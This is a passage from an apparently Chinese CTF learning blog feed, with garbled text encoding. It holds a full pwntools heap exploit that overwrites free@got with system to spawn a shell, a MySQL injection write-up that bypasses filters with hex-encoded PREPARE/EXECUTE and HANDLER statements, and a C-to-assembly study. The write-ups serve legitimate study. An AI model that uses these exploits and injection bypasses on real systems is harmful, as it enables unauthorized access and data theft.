punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span> <span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span></code></pre><p>æ­¤æ—¶å †ç»“æ„å¦‚ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/29.jpg" alt=""></p><p>æœ€åæˆ‘ä»¬å°†free@gotä¿®æ”¹ä¸ºsystem@gotï¼Œå†freeæ‰content[0]å³å¯getshell</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å®Œæ•´expå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./heapcreator'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",27942)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'heapcreator'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span> <span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å †æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLæ³¨å…¥</title>
      <link href="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/"/>
      <url>/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/</url>
      
        <content type="html"><![CDATA[<p>å¤ä¹ äº†ä¸€ä¸‹SQLæ³¨å…¥ï¼Œå‘è§‰è¿˜å¾ˆæœ‰ä¸€éƒ¨åˆ†çŸ¥è¯†ç‚¹æ²¡æŒæ¡ï¼Œè®°å½•ä¸€ä¸‹<br>ä»¥2019å¼ºç½‘æ¯éšä¾¿æ³¨ä¸ºä¾‹ï¼Œä¹‹å‰æ˜¯ç”¨çš„æ›´æ”¹åˆ—åå’Œè¡¨åæ¥åšçš„ï¼Œä½†ç›¸å¯¹äºåˆ©ç”¨MySQLé¢„å¤„ç†è¯­å¥æ¥åšè¦éº»çƒ¦å¾ˆå¤šï¼Œå…ˆäº†è§£ä¸€ä¸‹MySQLçš„é¢„å¤„ç†è¯­å¥</p><a id="more"></a><pre class=" language-sql"><code class="language-sql">è¯­æ³•ï¼šå®šä¹‰é¢„å¤„ç†è¯­å¥PREPARE stmt_name <span class="token keyword">FROM</span> preparable_stmt<span class="token punctuation">;</span>æ‰§è¡Œé¢„å¤„ç†è¯­å¥<span class="token keyword">EXECUTE</span> stmt_name <span class="token punctuation">[</span><span class="token keyword">USING</span> <span class="token variable">@var_name</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token variable">@var_name</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">;</span>åˆ é™¤<span class="token punctuation">(</span>é‡Šæ”¾<span class="token punctuation">)</span>å®šä¹‰{<span class="token keyword">DEALLOCATE</span> <span class="token operator">|</span> <span class="token keyword">DROP</span>} PREPARE stmt_name<span class="token punctuation">;</span><span class="token keyword">set</span>è¯­å¥å¯ç”¨äºå‘ç³»ç»Ÿå˜é‡æˆ–ç”¨æˆ·å˜é‡èµ‹å€¼ï¼Œé’ˆå¯¹ç”¨æˆ·å˜é‡çš„å®šä¹‰å¦‚ä¸‹ï¼š<span class="token keyword">SET</span> <span class="token variable">@var_name</span> <span class="token operator">=</span> expr <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token variable">@var_name</span> <span class="token operator">=</span> expr<span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>ç®€å•æ¥è¯´ï¼Œé¢„å®šä¹‰è¯­å¥å°±ç±»ä¼¼äºCçš„defineå…³é”®å­—<br>å†æ¥çœ‹é¢˜<br>æˆ‘ä»¬å·²ç»çŸ¥é“äº†flagåœ¨1919810931114514è¡¨ä¸­<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/1.jpg" alt=""><br>ä¸åœ¨æˆ‘ä»¬å½“å‰è¡¨ä¸­ï¼Œéœ€è¦è·¨è¡¨æŸ¥è¯¢ï¼Œä½†èƒ½å¤ŸæŸ¥è¯¢çš„è¯­å¥éƒ½è¢«è¿‡æ»¤æ‰äº†<br>è¿™æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é¢„å®šä¹‰è¯­å¥ï¼Œå¦‚ä¸‹</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">Set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#0x73656c656374202a2066726f6d20603139313938313039333131313435313460æ˜¯select * from `1919810931114514`çš„16è¿›åˆ¶ç¼–ç </span>Prepare x <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token keyword">Execute</span> x</code></pre><p>ç¬¬ä¸€å¥ç›¸å½“äºæŠŠå˜é‡@aèµ‹å€¼ä¸º0x73656c656374202a2066726f6d20603139313938313039333131313435313460<br>ç¬¬äºŒå¥å°†@aé¢„ç¼–è¯‘ä¸ºx<br>ç¬¬ä¸‰å¥æ‰§è¡Œx<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/2.jpg" alt=""><br>å¯ä»¥è·å¾—flag</p><p>å†æ¥çœ‹å¦ä¸€ç§æ–¹æ³•</p><pre class=" language-bash"><code class="language-bash">handlerè¯­å¥ä»£æ›¿selectæŸ¥è¯¢mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­</code></pre><pre class=" language-sql"><code class="language-sql">è¯­æ³•ç»“æ„<span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">OPEN</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token keyword">AS</span><span class="token punctuation">]</span> alias<span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token operator">=</span> <span class="token operator">|</span> <span class="token operator">&lt;=</span> <span class="token operator">|</span> <span class="token operator">>=</span> <span class="token operator">|</span> <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">></span> } <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> <span class="token operator">|</span> <span class="token keyword">PREV</span> <span class="token operator">|</span> <span class="token keyword">LAST</span> }    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> }    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">CLOSE</span></code></pre><p>æˆ‘ç”¨æœ¬åœ°çš„sqli-labçš„secruityåº“çš„usersè¡¨æ¥æµ‹è¯•<br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/3.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/4.jpg" alt=""><br>èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œåœ°è¯»å–è¡¨ä¸­çš„å†…å®¹<br>å†å›åˆ°é¢˜ç›®<br>æˆ‘ä»¬çš„sqlè¯­å¥å¦‚ä¸‹</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">handler</span> \<span class="token punctuation">`</span><span class="token number">1919810931114514</span>\<span class="token punctuation">`</span> <span class="token keyword">open</span> <span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">handler</span> <span class="token number">a</span> <span class="token keyword">read</span> <span class="token keyword">next</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/5.jpg" alt=""><br>åŒæ ·èƒ½å¤Ÿè¯»å–flag</p><p>é¢„ç¼–è¯‘è¯­å¥è¯´å®Œäº†ï¼Œå†çœ‹åˆ°æ— åˆ—åæ³¨å…¥</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQLé¢„å¤„ç† </tag>
            
            <tag> æ— åˆ—åæ³¨å…¥ </tag>
            
            <tag> order byç›²æ³¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€è§„åˆ’çš„èƒŒåŒ…é—®é¢˜</title>
      <link href="/LawlietLW.github.io/2020/02/10/c-yu-yan-zai-hui-bian-zhong-de-biao-xian-xing-shi/"/>
      <url>/LawlietLW.github.io/2020/02/10/c-yu-yan-zai-hui-bian-zhong-de-biao-xian-xing-shi/</url>
      
        <content type="html"><![CDATA[<p>â€‹        åœ¨åšæŸäº›ä»£ç é‡æ¯”è¾ƒå¤§ä¸”æ¯”è¾ƒæ‚çš„é¢˜æ—¶æ·±æ„Ÿä»£ç å®¡è®¡çš„åƒåŠ›ï¼ŒåŸºç¡€è¿˜æ˜¯ä¸å¤Ÿæ‰å®ï¼Œæ¯”å¦‚vmpwnï¼Œè™šæ‹Ÿæœºå®ç°çš„åŠŸèƒ½ç¿»è¯‘å‡ºæ¥çš„ä¼ªCä»£ç çœ‹çš„ç¡®å®è´¹åŠ›ï¼Œä»æ±‡ç¼–å±‚åˆ†æå¯èƒ½ä¼šæ›´ä¸ºæ¸…æ™°ï¼Œæ‰€ä»¥æ‰“ç®—å°†Cè¯­è¨€ä¸­çš„ä¸€äº›å¸¸ç”¨ä»£ç è½¬æ¢æˆæ±‡ç¼–ä»£ç åˆ†æä¸€ä¸‹ï¼Œå·©å›ºä¸€ä¸‹åŸºç¡€</p><h2 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">></span>b<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>b<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿™ä¸ªdemoä¸­æœ‰å®šä¹‰å˜é‡ï¼Œå‡½æ•°è°ƒç”¨ï¼Œifåˆ¤æ–­ï¼Œswitchè¯­å¥å’Œforå¾ªç¯ï¼Œçœ‹ä¸€çœ‹åæ±‡ç¼–å‡ºæ¥çš„mainå‡½æ•°</p><pre class=" language-assembly"><code class="language-assembly">/*objdump --disassemble=main -M intel ./demo*/401186:    55                       push   rbp401187:    48 89 e5                 mov    rbp,rsp40118a:    48 83 ec 20              sub    rsp,0x2040118e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28401195:    00 00 401197:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax40119b:    31 c0                    xor    eax,eax40119d:    48 8d 45 e8              lea    rax,[rbp-0x18]4011a1:    48 89 c6                 mov    rsi,rax4011a4:    bf 04 20 40 00           mov    edi,0x4020044011a9:    b8 00 00 00 00           mov    eax,0x04011ae:    e8 bd fe ff ff           call   401070 <__isoc99_scanf@plt>4011b3:    48 8d 45 ec              lea    rax,[rbp-0x14]4011b7:    48 89 c6                 mov    rsi,rax4011ba:    bf 04 20 40 00           mov    edi,0x4020044011bf:    b8 00 00 00 00           mov    eax,0x04011c4:    e8 a7 fe ff ff           call   401070 <__isoc99_scanf@plt>4011c9:    8b 55 e8                 mov    edx,DWORD PTR [rbp-0x18]4011cc:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]4011cf:    39 c2                    cmp    edx,eax4011d1:    7e 4e                    jle    401221 <main+0x9b>4011d3:    48 8d 45 f0              lea    rax,[rbp-0x10]4011d7:    48 89 c6                 mov    rsi,rax4011da:    bf 04 20 40 00           mov    edi,0x4020044011df:    b8 00 00 00 00           mov    eax,0x04011e4:    e8 87 fe ff ff           call   401070 <__isoc99_scanf@plt>4011e9:    8b 45 f0                 mov    eax,DWORD PTR [rbp-0x10]4011ec:    83 f8 02                 cmp    eax,0x24011ef:    74 18                    je     401209 <main+0x83>4011f1:    83 f8 03                 cmp    eax,0x34011f4:    74 1f                    je     401215 <main+0x8f>4011f6:    83 f8 01                 cmp    eax,0x14011f9:    74 02                    je     4011fd <main+0x77>4011fb:    eb 4d                    jmp    40124a <main+0xc4>4011fd:    bf 31 00 00 00           mov    edi,0x31401202:    e8 29 fe ff ff           call   401030 <putchar@plt>401207:    eb 41                    jmp    40124a <main+0xc4>401209:    bf 32 00 00 00           mov    edi,0x3240120e:    e8 1d fe ff ff           call   401030 <putchar@plt>401213:    eb 35                    jmp    40124a <main+0xc4>401215:    bf 33 00 00 00           mov    edi,0x3340121a:    e8 11 fe ff ff           call   401030 <putchar@plt>40121f:    eb 29                    jmp    40124a <main+0xc4>401221:    c7 45 f4 00 00 00 00     mov    DWORD PTR [rbp-0xc],0x0401228:    eb 18                    jmp    401242 <main+0xbc>40122a:    8b 45 f4                 mov    eax,DWORD PTR [rbp-0xc]40122d:    89 c6                    mov    esi,eax40122f:    bf 04 20 40 00           mov    edi,0x402004401234:    b8 00 00 00 00           mov    eax,0x0401239:    e8 12 fe ff ff           call   401050 <printf@plt>40123e:    83 45 f4 01              add    DWORD PTR [rbp-0xc],0x1401242:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]401245:    39 45 f4                 cmp    DWORD PTR [rbp-0xc],eax401248:    7e e0                    jle    40122a <main+0xa4>40124a:    b8 00 00 00 00           mov    eax,0x040124f:    48 8b 4d f8              mov    rcx,QWORD PTR [rbp-0x8]401253:    64 48 33 0c 25 28 00     xor    rcx,QWORD PTR fs:0x2840125a:    00 00 40125c:    74 05                    je     401263 <main+0xdd>40125e:    e8 dd fd ff ff           call   401040 <__stack_chk_fail@plt>401263:    c9                       leave  401264:    c3                       ret</code></pre><p>æˆ‘ä»¬æŒ‰ç…§cä»£ç çš„é¡ºåºæ¥çœ‹ï¼Œé¦–å…ˆæ˜¯<strong>scanf(â€œ%dâ€,&amp;a);scanf(â€œ%dâ€,&amp;b);</strong>ï¼Œå¯¹åº”çš„æ±‡ç¼–ä»£ç ä¸º</p><pre class=" language-assembly"><code class="language-assembly">40119d:    48 8d 45 e8              lea    rax,[rbp-0x18]4011a1:    48 89 c6                 mov    rsi,rax4011a4:    bf 04 20 40 00           mov    edi,0x4020044011a9:    b8 00 00 00 00           mov    eax,0x04011ae:    e8 bd fe ff ff           call   401070 <__isoc99_scanf@plt>4011b3:    48 8d 45 ec              lea    rax,[rbp-0x14]4011b7:    48 89 c6                 mov    rsi,rax4011ba:    bf 04 20 40 00           mov    edi,0x4020044011bf:    b8 00 00 00 00           mov    eax,0x04011c4:    e8 a7 fe ff ff           call   401070 <__isoc99_scanf@plt></code></pre><p>leaçš„ä½œç”¨æ˜¯å–åœ°å€ï¼ŒæŠŠ$rbp-0x18å­˜å…¥raxä¸­ï¼Œè¿™é‡Œå°±æ˜¯å˜é‡<strong>a</strong>çš„åœ°å€ï¼Œä¸‹ä¸€å¥å°±æ˜¯ä¼ å‚äº†ï¼Œ64ä½ç¨‹åºä¼ å‚é¡ºåºæ˜¯rdiï¼Œrsiï¼Œrdxï¼Œscanfç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œ<strong>mov    edi,0x402004</strong>è¿™ä¸€å¥å³æ˜¯ä¼ å‚æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><p><img src="/LawlietLW.github.io/2020/02/10/c-yu-yan-zai-hui-bian-zhong-de-biao-xian-xing-shi/D:%5CHexo%5Csource_posts%5CC%E8%AF%AD%E8%A8%80%E5%9C%A8%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F%5C1.jpg" alt="1"></p><p>gdbè°ƒè¯•å¯ä»¥ç¡®å®š</p><p>ä¹‹åå°±æ˜¯è°ƒç”¨scanfå‡½æ•°äº†</p><p>å†çœ‹åˆ°<strong>if(a&gt;b)</strong>è¿™ä¸€å¥</p><pre class=" language-assembly"><code class="language-assembly">4011c9:    8b 55 e8                 mov    edx,DWORD PTR [rbp-0x18]4011cc:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]4011cf:    39 c2                    cmp    edx,eax4011d1:    7e 4e                    jle    401221 <main+0x9b></code></pre><p>å°†açš„å€¼æ”¾å…¥edxï¼Œå°†bçš„å€¼æ”¾å…¥eaxï¼Œç„¶åæ¯”è¾ƒedxå’Œeaxï¼Œjleå³jmp less equal,å°äºç­‰äºå°±è·³è½¬ï¼Œè¿™æ ·å°±ç›´æ¥è·³è½¬åˆ°äº†elseè¯­å¥å¤„ï¼Œæˆ‘ä»¬å…ˆçœ‹elseçš„ä»£ç å—</p><pre class=" language-assembly"><code class="language-assembly">else    {        for(int i=0;i<=b;i++)            printf("%d",i);    }</code></pre><p>å¯¹åº”çš„æ±‡ç¼–è¯­å¥å¦‚ä¸‹</p><pre class=" language-assembly"><code class="language-assembly">401221:    c7 45 f4 00 00 00 00     mov    DWORD PTR [rbp-0xc],0x0401228:    eb 18                    jmp    401242 <main+0xbc>40122a:    8b 45 f4                 mov    eax,DWORD PTR [rbp-0xc]40122d:    89 c6                    mov    esi,eax40122f:    bf 04 20 40 00           mov    edi,0x402004401234:    b8 00 00 00 00           mov    eax,0x0401239:    e8 12 fe ff ff           call   401050 <printf@plt>40123e:    83 45 f4 01              add    DWORD PTR [rbp-0xc],0x1401242:    8b 45 ec                 mov    